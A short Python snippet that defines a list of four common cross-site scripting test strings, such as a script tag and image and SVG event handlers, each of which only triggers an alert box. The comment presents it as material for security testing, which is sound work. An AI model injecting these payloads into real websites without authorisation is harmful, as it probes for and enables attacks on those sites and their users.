# A simple list of XSS payloads for testing
PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<svg onload=alert(1)>"
]
